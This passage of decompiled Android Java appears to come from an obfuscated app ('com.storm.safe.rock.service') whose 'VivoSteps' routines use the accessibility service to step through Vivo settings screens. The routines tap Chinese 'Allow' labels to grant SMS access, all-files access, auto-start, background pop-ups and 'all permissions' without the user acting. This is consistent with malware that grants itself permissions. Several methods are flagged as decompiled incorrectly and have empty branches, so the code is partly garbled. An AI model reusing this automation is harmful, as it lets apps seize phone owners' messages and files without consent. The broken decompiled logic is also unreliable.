                if (((Boolean) objValueOf).booleanValue()) {
                }
                break;
            case 4:
                str2 = vivoSteps$executeFlowB$1.f54876a1;
                c0371a8 = vivoSteps$executeFlowB$1.f54875a0;
                kg1.m213544f4(objValueOf);
                vivoSteps$executeFlowB$1.f54875a0 = c0371a8;
                vivoSteps$executeFlowB$1.f54876a1 = str2;
                vivoSteps$executeFlowB$1.f54879a4 = 5;
                objValueOf = c0371a8.m212393b0("短信", 0, 5, vivoSteps$executeFlowB$1);
                if (objValueOf != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 5:
                str2 = vivoSteps$executeFlowB$1.f54876a1;
                c0371a8 = vivoSteps$executeFlowB$1.f54875a0;
                kg1.m213544f4(objValueOf);
                zBooleanValue = ((Boolean) objValueOf).booleanValue();
                if (zBooleanValue) {
                }
                return coroutineSingletons;
            case 6:
                str2 = vivoSteps$executeFlowB$1.f54876a1;
                c0371a8 = vivoSteps$executeFlowB$1.f54875a0;
                kg1.m213544f4(objValueOf);
                zBooleanValue = ((Boolean) objValueOf).booleanValue();
                if (zBooleanValue) {
                }
                break;
            case 7:
                str2 = vivoSteps$executeFlowB$1.f54876a1;
                c0371a8 = vivoSteps$executeFlowB$1.f54875a0;
                kg1.m213544f4(objValueOf);
                vivoSteps$executeFlowB$1.f54875a0 = c0371a8;
                vivoSteps$executeFlowB$1.f54876a1 = str2;
                vivoSteps$executeFlowB$1.f54879a4 = 8;
                objValueOf = c0371a8.m212393b0("允许", 0, 5, vivoSteps$executeFlowB$1);
                if (objValueOf != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 8:
                str2 = vivoSteps$executeFlowB$1.f54876a1;
                c0371a8 = vivoSteps$executeFlowB$1.f54875a0;
                kg1.m213544f4(objValueOf);
                if (((Boolean) objValueOf).booleanValue()) {
                }
                break;
            case 9:
                str2 = vivoSteps$executeFlowB$1.f54876a1;
                c0371a8 = vivoSteps$executeFlowB$1.f54875a0;
                kg1.m213544f4(objValueOf);
                vivoSteps$executeFlowB$1.f54875a0 = c0371a8;
                vivoSteps$executeFlowB$1.f54876a1 = str2;
                vivoSteps$executeFlowB$1.f54879a4 = 10;
                if (c0371a8.m212407c5(str2, vivoSteps$executeFlowB$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 10:
                str2 = vivoSteps$executeFlowB$1.f54876a1;
                c0371a8 = vivoSteps$executeFlowB$1.f54875a0;
                kg1.m213544f4(objValueOf);
                vivoSteps$executeFlowB$1.f54875a0 = c0371a8;
                vivoSteps$executeFlowB$1.f54876a1 = str2;
                vivoSteps$executeFlowB$1.f54879a4 = 11;
                if (b81.m210571b1(200L, vivoSteps$executeFlowB$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case oe0.DEFAULT_M /* 11 */:
                str2 = vivoSteps$executeFlowB$1.f54876a1;
                c0371a8 = vivoSteps$executeFlowB$1.f54875a0;
                kg1.m213544f4(objValueOf);
                vivoSteps$executeFlowB$1.f54875a0 = c0371a8;
                vivoSteps$executeFlowB$1.f54876a1 = str2;
                vivoSteps$executeFlowB$1.f54879a4 = 12;
                objValueOf = c0371a8.m212393b0("存储#文件与文档", 0, 5, vivoSteps$executeFlowB$1);
                if (objValueOf != coroutineSingletons) {
                }
                return coroutineSingletons;
            case FileClientSessionCache.MAX_SIZE /* 12 */:
                str2 = vivoSteps$executeFlowB$1.f54876a1;
                c0371a8 = vivoSteps$executeFlowB$1.f54875a0;
                kg1.m213544f4(objValueOf);
                if (((Boolean) objValueOf).booleanValue()) {
                }
                return coroutineSingletons;
            case 13:
                str2 = vivoSteps$executeFlowB$1.f54876a1;
                c0371a8 = vivoSteps$executeFlowB$1.f54875a0;
                kg1.m213544f4(objValueOf);
                if (!((Boolean) objValueOf).booleanValue()) {
                    return Boolean.FALSE;
                }
                vivoSteps$executeFlowB$1.f54875a0 = c0371a8;
                vivoSteps$executeFlowB$1.f54876a1 = str2;
                vivoSteps$executeFlowB$1.f54879a4 = 14;
                if (b81.m210571b1(200L, vivoSteps$executeFlowB$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 14:
                str2 = vivoSteps$executeFlowB$1.f54876a1;
                c0371a8 = vivoSteps$executeFlowB$1.f54875a0;
                kg1.m213544f4(objValueOf);
                vivoSteps$executeFlowB$1.f54875a0 = c0371a8;
                vivoSteps$executeFlowB$1.f54876a1 = str2;
                vivoSteps$executeFlowB$1.f54879a4 = 15;
                objValueOf = c0371a8.m212393b0("允许管理所有文件#允许#仅允许访问媒体文件", 0, 5, vivoSteps$executeFlowB$1);
                if (objValueOf != coroutineSingletons) {
                }
                return coroutineSingletons;
            case WebSocketProtocol.B0_MASK_OPCODE /* 15 */:
                str2 = vivoSteps$executeFlowB$1.f54876a1;
                c0371a8 = vivoSteps$executeFlowB$1.f54875a0;
                kg1.m213544f4(objValueOf);
                if (((Boolean) objValueOf).booleanValue()) {
                }
                return coroutineSingletons;
            case 16:
                str2 = vivoSteps$executeFlowB$1.f54876a1;
                c0371a8 = vivoSteps$executeFlowB$1.f54875a0;
                kg1.m213544f4(objValueOf);
                if (!((Boolean) objValueOf).booleanValue()) {
                    return Boolean.FALSE;
                }
                vivoSteps$executeFlowB$1.f54875a0 = c0371a8;
                vivoSteps$executeFlowB$1.f54876a1 = str2;
                vivoSteps$executeFlowB$1.f54879a4 = 17;
                if (b81.m210571b1(200L, vivoSteps$executeFlowB$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 17:
                str2 = vivoSteps$executeFlowB$1.f54876a1;
                c0371a8 = vivoSteps$executeFlowB$1.f54875a0;
                kg1.m213544f4(objValueOf);
                if (Build.VERSION.SDK_INT != 33) {
                }
                return coroutineSingletons;
            case 18:
                str2 = vivoSteps$executeFlowB$1.f54876a1;
                c0371a8 = vivoSteps$executeFlowB$1.f54875a0;
                kg1.m213544f4(objValueOf);
                vivoSteps$executeFlowB$1.f54875a0 = c0371a8;
                vivoSteps$executeFlowB$1.f54876a1 = str2;
                vivoSteps$executeFlowB$1.f54879a4 = 19;
                if (b81.m210571b1(100L, vivoSteps$executeFlowB$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case Base64.Encoder.LINE_GROUPS /* 19 */:
                str2 = vivoSteps$executeFlowB$1.f54876a1;
                c0371a8 = vivoSteps$executeFlowB$1.f54875a0;
                kg1.m213544f4(objValueOf);
                str3 = Build.MODEL;
                if (AbstractC0779a1.m213656a9(str3, "V2106A")) {
                    break;
                }
                vivoSteps$executeFlowB$1.f54875a0 = c0371a8;
                vivoSteps$executeFlowB$1.f54876a1 = str2;
                vivoSteps$executeFlowB$1.f54879a4 = 20;
                if (c0371a8.m212393b0("允许", 0, 5, vivoSteps$executeFlowB$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 20:
                str2 = vivoSteps$executeFlowB$1.f54876a1;
                c0371a82 = vivoSteps$executeFlowB$1.f54875a0;
                kg1.m213544f4(objValueOf);
                vivoSteps$executeFlowB$1.f54875a0 = c0371a82;
                vivoSteps$executeFlowB$1.f54876a1 = str2;
                vivoSteps$executeFlowB$1.f54879a4 = 21;
                break;
            case 21:
                str2 = vivoSteps$executeFlowB$1.f54876a1;
                c0371a82 = vivoSteps$executeFlowB$1.f54875a0;
                kg1.m213544f4(objValueOf);
                c0371a8 = c0371a82;
                vivoSteps$executeFlowB$1.f54875a0 = c0371a8;
                vivoSteps$executeFlowB$1.f54876a1 = str2;
                vivoSteps$executeFlowB$1.f54879a4 = 22;
                if (c0371a8.m212407c5(str2, vivoSteps$executeFlowB$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 22:
                str2 = vivoSteps$executeFlowB$1.f54876a1;
                c0371a83 = vivoSteps$executeFlowB$1.f54875a0;
                kg1.m213544f4(objValueOf);
                vivoSteps$executeFlowB$1.f54875a0 = c0371a83;
                vivoSteps$executeFlowB$1.f54876a1 = str2;
                vivoSteps$executeFlowB$1.f54879a4 = 23;
                if (b81.m210571b1(200L, vivoSteps$executeFlowB$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 23:
                str2 = vivoSteps$executeFlowB$1.f54876a1;
                c0371a83 = vivoSteps$executeFlowB$1.f54875a0;
                kg1.m213544f4(objValueOf);
                vivoSteps$executeFlowB$1.f54875a0 = c0371a83;
                vivoSteps$executeFlowB$1.f54876a1 = str2;
                vivoSteps$executeFlowB$1.f54879a4 = 24;
                objValueOf = c0371a83.m212393b0("单项权限设置#所有权限", Buffer.SEGMENTING_THRESHOLD, 5, vivoSteps$executeFlowB$1);
                if (objValueOf != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 24:
                str2 = vivoSteps$executeFlowB$1.f54876a1;
                c0371a83 = vivoSteps$executeFlowB$1.f54875a0;
                kg1.m213544f4(objValueOf);
                c0371a84 = c0371a83;
                if (!((Boolean) objValueOf).booleanValue()) {
                }
                return coroutineSingletons;
            case 25:
                str2 = vivoSteps$executeFlowB$1.f54876a1;
                c0371a84 = vivoSteps$executeFlowB$1.f54875a0;
                kg1.m213544f4(objValueOf);
                if (!((Boolean) objValueOf).booleanValue()) {
                    return Boolean.FALSE;
                }
                vivoSteps$executeFlowB$1.f54875a0 = c0371a84;
                vivoSteps$executeFlowB$1.f54876a1 = str2;
                vivoSteps$executeFlowB$1.f54879a4 = 26;
                if (b81.m210571b1(200L, vivoSteps$executeFlowB$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 26:
                str2 = vivoSteps$executeFlowB$1.f54876a1;
                c0371a84 = vivoSteps$executeFlowB$1.f54875a0;
                kg1.m213544f4(objValueOf);
                vivoSteps$executeFlowB$1.f54875a0 = c0371a84;
                vivoSteps$executeFlowB$1.f54876a1 = str2;
                vivoSteps$executeFlowB$1.f54879a4 = 27;
                objValueOf = c0371a84.m212430f8(30, "后台弹出界面", vivoSteps$executeFlowB$1, true);
                if (objValueOf != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 27:
                str2 = vivoSteps$executeFlowB$1.f54876a1;
                c0371a84 = vivoSteps$executeFlowB$1.f54875a0;
                kg1.m213544f4(objValueOf);
                if (!((Boolean) objValueOf).booleanValue()) {
                }
                break;
            case 28:
                str2 = vivoSteps$executeFlowB$1.f54876a1;
                c0371a84 = vivoSteps$executeFlowB$1.f54875a0;
                kg1.m213544f4(objValueOf);
                vivoSteps$executeFlowB$1.f54875a0 = null;
                vivoSteps$executeFlowB$1.f54876a1 = null;
                vivoSteps$executeFlowB$1.f54879a4 = 29;
                if (c0371a84.m212407c5(str2, vivoSteps$executeFlowB$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 29:
                kg1.m213544f4(objValueOf);
                vivoSteps$executeFlowB$1.f54879a4 = 30;
                break;
            case 30:
                kg1.m213544f4(objValueOf);
                return Boolean.TRUE;
            default:
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
        }
    }

    /* JADX WARN: Code restructure failed: missing block: B:129:0x02d4, code lost:
    
        if (p000.b81.m210571b1(500, r2) == r3) goto L130;
     */
    /* JADX WARN: Code restructure failed: missing block: B:75:0x01ab, code lost:
    
        if (r1 == r3) goto L130;
     */
    /* JADX WARN: Removed duplicated region for block: B:104:0x024f  */
    /* JADX WARN: Removed duplicated region for block: B:109:0x0263 A[LOOP:0: B:107:0x025d->B:109:0x0263, LOOP_END] */
    /* JADX WARN: Removed duplicated region for block: B:113:0x0286  */
    /* JADX WARN: Removed duplicated region for block: B:116:0x028f  */
    /* JADX WARN: Removed duplicated region for block: B:118:0x0292  */
    /* JADX WARN: Removed duplicated region for block: B:124:0x02b5 A[PHI: r1 r4
      0x02b5: PHI (r1v72 java.lang.Object) = (r1v71 java.lang.Object), (r1v1 java.lang.Object) binds: [B:122:0x02b2, B:13:0x003b] A[DONT_GENERATE, DONT_INLINE]
      0x02b5: PHI (r4v49 com.storm.safe.rock.service.modules.yw5xud.a8) = (r4v47 com.storm.safe.rock.service.modules.yw5xud.a8), (r4v51 com.storm.safe.rock.service.modules.yw5xud.a8) binds: [B:122:0x02b2, B:13:0x003b] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:126:0x02bd  */
    /* JADX WARN: Removed duplicated region for block: B:128:0x02c7  */
    /* JADX WARN: Removed duplicated region for block: B:36:0x00f7  */
    /* JADX WARN: Removed duplicated region for block: B:38:0x00fa  */
    /* JADX WARN: Removed duplicated region for block: B:44:0x011a  */
    /* JADX WARN: Removed duplicated region for block: B:46:0x011d  */
    /* JADX WARN: Removed duplicated region for block: B:52:0x013f A[PHI: r1 r4 r7
      0x013f: PHI (r1v16 java.lang.Object) = (r1v15 java.lang.Object), (r1v1 java.lang.Object) binds: [B:50:0x013b, B:26:0x00b4] A[DONT_GENERATE, DONT_INLINE]
      0x013f: PHI (r4v15 java.lang.String) = (r4v13 java.lang.String), (r4v16 java.lang.String) binds: [B:50:0x013b, B:26:0x00b4] A[DONT_GENERATE, DONT_INLINE]
      0x013f: PHI (r7v7 com.storm.safe.rock.service.modules.yw5xud.a8) = (r7v5 com.storm.safe.rock.service.modules.yw5xud.a8), (r7v8 com.storm.safe.rock.service.modules.yw5xud.a8) binds: [B:50:0x013b, B:26:0x00b4] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:54:0x0147  */
    /* JADX WARN: Removed duplicated region for block: B:56:0x014a  */
    /* JADX WARN: Removed duplicated region for block: B:62:0x0169 A[PHI: r1 r4 r7
      0x0169: PHI (r1v24 java.lang.Object) = (r1v23 java.lang.Object), (r1v1 java.lang.Object) binds: [B:60:0x0165, B:24:0x00a2] A[DONT_GENERATE, DONT_INLINE]
      0x0169: PHI (r4v19 java.lang.String) = (r4v17 java.lang.String), (r4v20 java.lang.String) binds: [B:60:0x0165, B:24:0x00a2] A[DONT_GENERATE, DONT_INLINE]
      0x0169: PHI (r7v11 com.storm.safe.rock.service.modules.yw5xud.a8) = (r7v9 com.storm.safe.rock.service.modules.yw5xud.a8), (r7v12 com.storm.safe.rock.service.modules.yw5xud.a8) binds: [B:60:0x0165, B:24:0x00a2] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:64:0x0171  */
    /* JADX WARN: Removed duplicated region for block: B:66:0x0174  */
    /* JADX WARN: Removed duplicated region for block: B:72:0x0195 A[PHI: r1 r4 r7
      0x0195: PHI (r1v33 java.lang.Object) = (r1v32 java.lang.Object), (r1v1 java.lang.Object) binds: [B:70:0x0191, B:22:0x0090] A[DONT_GENERATE, DONT_INLINE]
      0x0195: PHI (r4v23 java.lang.String) = (r4v21 java.lang.String), (r4v24 java.lang.String) binds: [B:70:0x0191, B:22:0x0090] A[DONT_GENERATE, DONT_INLINE]
      0x0195: PHI (r7v15 com.storm.safe.rock.service.modules.yw5xud.a8) = (r7v13 com.storm.safe.rock.service.modules.yw5xud.a8), (r7v16 com.storm.safe.rock.service.modules.yw5xud.a8) binds: [B:70:0x0191, B:22:0x0090] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:74:0x019d  */
    /* JADX WARN: Removed duplicated region for block: B:78:0x01b5 A[PHI: r1 r4 r7
      0x01b5: PHI (r1v39 boolean) = (r1v35 boolean), (r1v44 boolean) binds: [B:73:0x019b, B:77:0x01af] A[DONT_GENERATE, DONT_INLINE]
      0x01b5: PHI (r4v25 java.lang.String) = (r4v23 java.lang.String), (r4v26 java.lang.String) binds: [B:73:0x019b, B:77:0x01af] A[DONT_GENERATE, DONT_INLINE]
      0x01b5: PHI (r7v17 com.storm.safe.rock.service.modules.yw5xud.a8) = (r7v15 com.storm.safe.rock.service.modules.yw5xud.a8), (r7v18 com.storm.safe.rock.service.modules.yw5xud.a8) binds: [B:73:0x019b, B:77:0x01af] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:79:0x01b7  */
    /* JADX WARN: Removed duplicated region for block: B:7:0x0017  */
    /* JADX WARN: Removed duplicated region for block: B:84:0x01cf  */
    /* JADX WARN: Removed duplicated region for block: B:86:0x01d2  */
    /* JADX WARN: Removed duplicated region for block: B:88:0x01d5  */
    /* JADX WARN: Removed duplicated region for block: B:93:0x01ed  */
    /* JADX WARN: Removed duplicated region for block: B:95:0x01f0  */
    /* renamed from: c2 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m212404c2(String str, ContinuationImpl continuationImpl) throws Throwable {
        VivoSteps$executeFlowD$1 vivoSteps$executeFlowD$1;
        String str2;
        Object objM212419e7;
        C0371a8 c0371a8;
        String str3;
        boolean zBooleanValue;
        C0371a8 c0371a82;
        AccessibilityNodeInfo rootInActiveWindow;
        List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByViewId;
        C0371a8 c0371a83;
        List<AccessibilityNodeInfo> list;
        String str4;
        AccessibilityNodeInfo accessibilityNodeInfo;
        List<AccessibilityNodeInfo> list2;
        AccessibilityNodeInfo accessibilityNodeInfo2;
        Iterator<T> it;
        Object objM212393b0;
        C0371a8 c0371a84;
        if (continuationImpl instanceof VivoSteps$executeFlowD$1) {
            vivoSteps$executeFlowD$1 = (VivoSteps$executeFlowD$1) continuationImpl;
            int i = vivoSteps$executeFlowD$1.f54887a7;
            if ((i & Integer.MIN_VALUE) != 0) {
                vivoSteps$executeFlowD$1.f54887a7 = i - Integer.MIN_VALUE;
            } else {
                vivoSteps$executeFlowD$1 = new VivoSteps$executeFlowD$1(this, continuationImpl);
            }
        }
        Object objM212393b02 = vivoSteps$executeFlowD$1.f54885a5;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        switch (vivoSteps$executeFlowD$1.f54887a7) {
            case 0:
                kg1.m213544f4(objM212393b02);
                vivoSteps$executeFlowD$1.f54880a0 = this;
                str2 = str;
                vivoSteps$executeFlowD$1.f54881a1 = str2;
                vivoSteps$executeFlowD$1.f54887a7 = 1;
                objM212419e7 = m212419e7(10, vivoSteps$executeFlowD$1);
                if (objM212419e7 != coroutineSingletons) {
                    c0371a8 = this;
                    if (((Boolean) objM212419e7).booleanValue()) {
                        return Boolean.FALSE;
                    }
                    vivoSteps$executeFlowD$1.f54880a0 = c0371a8;
                    vivoSteps$executeFlowD$1.f54881a1 = str2;
                    vivoSteps$executeFlowD$1.f54887a7 = 2;
                    Object objM212393b03 = c0371a8.m212393b0("应用与权限", Buffer.SEGMENTING_THRESHOLD, 5, vivoSteps$executeFlowD$1);
                    if (objM212393b03 != coroutineSingletons) {
                        str3 = str2;
                        objM212393b02 = objM212393b03;
                        if (((Boolean) objM212393b02).booleanValue()) {
                            return Boolean.FALSE;
                        }
                        vivoSteps$executeFlowD$1.f54880a0 = c0371a8;
                        vivoSteps$executeFlowD$1.f54881a1 = str3;
                        vivoSteps$executeFlowD$1.f54887a7 = 3;
                        if (b81.m210571b1(300L, vivoSteps$executeFlowD$1) != coroutineSingletons) {
                            vivoSteps$executeFlowD$1.f54880a0 = c0371a8;
                            vivoSteps$executeFlowD$1.f54881a1 = str3;
                            vivoSteps$executeFlowD$1.f54887a7 = 4;
                            objM212393b02 = c0371a8.m212393b0("权限管理", 0, 5, vivoSteps$executeFlowD$1);
                            if (objM212393b02 != coroutineSingletons) {
                                if (((Boolean) objM212393b02).booleanValue()) {
                                    return Boolean.FALSE;
                                }
                                vivoSteps$executeFlowD$1.f54880a0 = c0371a8;
                                vivoSteps$executeFlowD$1.f54881a1 = str3;
                                vivoSteps$executeFlowD$1.f54887a7 = 5;
                                if (b81.m210571b1(200L, vivoSteps$executeFlowD$1) != coroutineSingletons) {
                                    vivoSteps$executeFlowD$1.f54880a0 = c0371a8;
                                    vivoSteps$executeFlowD$1.f54881a1 = str3;
                                    vivoSteps$executeFlowD$1.f54887a7 = 6;
                                    objM212393b02 = c0371a8.m212393b0("权限", 0, 5, vivoSteps$executeFlowD$1);
                                    if (objM212393b02 != coroutineSingletons) {
                                        if (((Boolean) objM212393b02).booleanValue()) {
                                            return Boolean.FALSE;
                                        }
                                        vivoSteps$executeFlowD$1.f54880a0 = c0371a8;
                                        vivoSteps$executeFlowD$1.f54881a1 = str3;
                                        vivoSteps$executeFlowD$1.f54887a7 = 7;
                                        if (b81.m210571b1(200L, vivoSteps$executeFlowD$1) != coroutineSingletons) {
                                            vivoSteps$executeFlowD$1.f54880a0 = c0371a8;
                                            vivoSteps$executeFlowD$1.f54881a1 = str3;
                                            vivoSteps$executeFlowD$1.f54887a7 = 8;
                                            objM212393b02 = c0371a8.m212393b0("自启动", 0, 5, vivoSteps$executeFlowD$1);
                                            if (objM212393b02 != coroutineSingletons) {
                                                zBooleanValue = ((Boolean) objM212393b02).booleanValue();
                                                if (zBooleanValue) {
                                                    vivoSteps$executeFlowD$1.f54880a0 = c0371a8;
                                                    vivoSteps$executeFlowD$1.f54881a1 = str3;
                                                    vivoSteps$executeFlowD$1.f54887a7 = 9;
                                                    objM212393b02 = c0371a8.m212393b0("Auto-start", 0, 5, vivoSteps$executeFlowD$1);
                                                    break;
                                                } else if (zBooleanValue) {
                                                    vivoSteps$executeFlowD$1.f54880a0 = c0371a8;
                                                    vivoSteps$executeFlowD$1.f54881a1 = str3;
                                                    vivoSteps$executeFlowD$1.f54887a7 = 10;
                                                    objM212393b02 = c0371a8.m212393b0("Auto start", 0, 5, vivoSteps$executeFlowD$1);
                                                    if (objM212393b02 != coroutineSingletons) {
                                                        c0371a82 = c0371a8;
                                                        zBooleanValue = ((Boolean) objM212393b02).booleanValue();
                                                        if (!zBooleanValue) {
                                                            return Boolean.FALSE;
                                                        }
                                                        vivoSteps$executeFlowD$1.f54880a0 = c0371a82;
                                                        vivoSteps$executeFlowD$1.f54881a1 = str3;
                                                        vivoSteps$executeFlowD$1.f54887a7 = 11;
                                                        if (b81.m210571b1(200L, vivoSteps$executeFlowD$1) != coroutineSingletons) {
                                                            rootInActiveWindow = c0371a82.f55139a0.getRootInActiveWindow();
                                                            if (rootInActiveWindow != null) {
                                                                return Boolean.FALSE;
                                                            }
                                                            listFindAccessibilityNodeInfosByViewId = rootInActiveWindow.findAccessibilityNodeInfosByViewId("android:id/search_src_text");
                                                            t60.m214694b5(listFindAccessibilityNodeInfosByViewId, "searchNodes");
                                                            if (!listFindAccessibilityNodeInfosByViewId.isEmpty()) {
                                                                AccessibilityNodeInfo accessibilityNodeInfo3 = listFindAccessibilityNodeInfosByViewId.get(0);
                                                                accessibilityNodeInfo3.performAction(1);
                                                                vivoSteps$executeFlowD$1.f54880a0 = c0371a82;
                                                                vivoSteps$executeFlowD$1.f54881a1 = str3;
                                                                vivoSteps$executeFlowD$1.f54882a2 = rootInActiveWindow;
                                                                vivoSteps$executeFlowD$1.f54883a3 = listFindAccessibilityNodeInfosByViewId;
                                                                vivoSteps$executeFlowD$1.f54884a4 = accessibilityNodeInfo3;
                                                                vivoSteps$executeFlowD$1.f54887a7 = 12;
                                                                if (b81.m210571b1(100L, vivoSteps$executeFlowD$1) != coroutineSingletons) {
                                                                    c0371a83 = c0371a82;
                                                                    list = listFindAccessibilityNodeInfosByViewId;
                                                                    str4 = str3;
                                                                    accessibilityNodeInfo = accessibilityNodeInfo3;
                                                                    Bundle bundle = new Bundle();
                                                                    bundle.putCharSequence("ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE", str4);
                                                                    accessibilityNodeInfo.performAction(2097152, bundle);
                                                                    accessibilityNodeInfo.recycle();
                                                                    vivoSteps$executeFlowD$1.f54880a0 = c0371a83;
                                                                    vivoSteps$executeFlowD$1.f54881a1 = str4;
                                                                    vivoSteps$executeFlowD$1.f54882a2 = rootInActiveWindow;
                                                                    vivoSteps$executeFlowD$1.f54883a3 = list;
                                                                    vivoSteps$executeFlowD$1.f54884a4 = null;
                                                                    vivoSteps$executeFlowD$1.f54887a7 = 13;
                                                                    if (b81.m210571b1(100L, vivoSteps$executeFlowD$1) != coroutineSingletons) {
                                                                        list2 = list;
                                                                        accessibilityNodeInfo2 = rootInActiveWindow;
                                                                        String str5 = str4;
                                                                        listFindAccessibilityNodeInfosByViewId = list2;
                                                                        str3 = str5;
                                                                        rootInActiveWindow = accessibilityNodeInfo2;
                                                                        c0371a82 = c0371a83;
                                                                        t60.m214694b5(listFindAccessibilityNodeInfosByViewId, "searchNodes");
                                                                        it = listFindAccessibilityNodeInfosByViewId.iterator();
                                                                        while (it.hasNext()) {
                                                                            ((AccessibilityNodeInfo) it.next()).recycle();
                                                                        }
                                                                        rootInActiveWindow.recycle();
                                                                        vivoSteps$executeFlowD$1.f54880a0 = c0371a82;
                                                                        vivoSteps$executeFlowD$1.f54881a1 = str3;
                                                                        vivoSteps$executeFlowD$1.f54882a2 = null;
                                                                        vivoSteps$executeFlowD$1.f54883a3 = null;
                                                                        vivoSteps$executeFlowD$1.f54887a7 = 14;
                                                                        objM212393b0 = c0371a82.m212393b0(str3, 1, 30, vivoSteps$executeFlowD$1);
                                                                        if (objM212393b0 != coroutineSingletons) {
                                                                            objM212393b02 = objM212393b0;
                                                                            if (!((Boolean) objM212393b02).booleanValue()) {
                                                                                vivoSteps$executeFlowD$1.f54880a0 = c0371a82;
                                                                                vivoSteps$executeFlowD$1.f54881a1 = str3;
                                                                                vivoSteps$executeFlowD$1.f54887a7 = 15;
                                                                                if (b81.m210571b1(200L, vivoSteps$executeFlowD$1) != coroutineSingletons) {
                                                                                    String str6 = str3;
                                                                                    c0371a84 = c0371a82;
                                                                                    vivoSteps$executeFlowD$1.f54880a0 = c0371a84;
                                                                                    vivoSteps$executeFlowD$1.f54881a1 = null;
                                                                                    vivoSteps$executeFlowD$1.f54887a7 = 16;
                                                                                    objM212393b02 = c0371a84.m212430f8(30, str6, vivoSteps$executeFlowD$1, true);
                                                                                    if (objM212393b02 != coroutineSingletons) {
                                                                                        if (!((Boolean) objM212393b02).booleanValue()) {
                                                                                            vivoSteps$executeFlowD$1.f54880a0 = null;
                                                                                            vivoSteps$executeFlowD$1.f54887a7 = 17;
                                                                                            break;
                                                                                        } else {
                                                                                            t60.m214704c5(c0371a84.f55141a2, "[Vivo流程D] ❌ 应用开关切换失败");
                                                                                            return Boolean.FALSE;
                                                                                        }
                                                                                    }
                                                                                }
                                                                            } else {
                                                                                return Boolean.FALSE;
                                                                            }
                                                                        }
                                                                    }
                                                                }
                                                            } else {
                                                                t60.m214694b5(listFindAccessibilityNodeInfosByViewId, "searchNodes");
                                                                it = listFindAccessibilityNodeInfosByViewId.iterator();
                                                                while (it.hasNext()) {
                                                                }
                                                                rootInActiveWindow.recycle();
                                                                vivoSteps$executeFlowD$1.f54880a0 = c0371a82;
                                                                vivoSteps$executeFlowD$1.f54881a1 = str3;
                                                                vivoSteps$executeFlowD$1.f54882a2 = null;
                                                                vivoSteps$executeFlowD$1.f54883a3 = null;
                                                                vivoSteps$executeFlowD$1.f54887a7 = 14;
                                                                objM212393b0 = c0371a82.m212393b0(str3, 1, 30, vivoSteps$executeFlowD$1);
                                                                if (objM212393b0 != coroutineSingletons) {
                                                                }
                                                            }
                                                        }
                                                    }
                                                } else {
                                                    c0371a82 = c0371a8;
                                                    if (!zBooleanValue) {
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
                return coroutineSingletons;
            case 1:
                String str7 = vivoSteps$executeFlowD$1.f54881a1;
                c0371a8 = vivoSteps$executeFlowD$1.f54880a0;
                kg1.m213544f4(objM212393b02);
                objM212419e7 = objM212393b02;
                str2 = str7;
                if (((Boolean) objM212419e7).booleanValue()) {
                }
                break;
            case 2:
                str3 = vivoSteps$executeFlowD$1.f54881a1;
                c0371a8 = vivoSteps$executeFlowD$1.f54880a0;
                kg1.m213544f4(objM212393b02);
                if (((Boolean) objM212393b02).booleanValue()) {
                }
                break;
            case 3:
                str3 = vivoSteps$executeFlowD$1.f54881a1;
                c0371a8 = vivoSteps$executeFlowD$1.f54880a0;
                kg1.m213544f4(objM212393b02);
                vivoSteps$executeFlowD$1.f54880a0 = c0371a8;
                vivoSteps$executeFlowD$1.f54881a1 = str3;
                vivoSteps$executeFlowD$1.f54887a7 = 4;
                objM212393b02 = c0371a8.m212393b0("权限管理", 0, 5, vivoSteps$executeFlowD$1);
                if (objM212393b02 != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 4:
                str3 = vivoSteps$executeFlowD$1.f54881a1;
                c0371a8 = vivoSteps$executeFlowD$1.f54880a0;
                kg1.m213544f4(objM212393b02);
                if (((Boolean) objM212393b02).booleanValue()) {
                }
                break;
            case 5:
                str3 = vivoSteps$executeFlowD$1.f54881a1;
                c0371a8 = vivoSteps$executeFlowD$1.f54880a0;
                kg1.m213544f4(objM212393b02);
                vivoSteps$executeFlowD$1.f54880a0 = c0371a8;
                vivoSteps$executeFlowD$1.f54881a1 = str3;
                vivoSteps$executeFlowD$1.f54887a7 = 6;
                objM212393b02 = c0371a8.m212393b0("权限", 0, 5, vivoSteps$executeFlowD$1);
                if (objM212393b02 != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 6:
                str3 = vivoSteps$executeFlowD$1.f54881a1;
                c0371a8 = vivoSteps$executeFlowD$1.f54880a0;
                kg1.m213544f4(objM212393b02);
                if (((Boolean) objM212393b02).booleanValue()) {
                }
                break;
            case 7:
                str3 = vivoSteps$executeFlowD$1.f54881a1;
                c0371a8 = vivoSteps$executeFlowD$1.f54880a0;
                kg1.m213544f4(objM212393b02);
                vivoSteps$executeFlowD$1.f54880a0 = c0371a8;
                vivoSteps$executeFlowD$1.f54881a1 = str3;
                vivoSteps$executeFlowD$1.f54887a7 = 8;
                objM212393b02 = c0371a8.m212393b0("自启动", 0, 5, vivoSteps$executeFlowD$1);
                if (objM212393b02 != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 8:
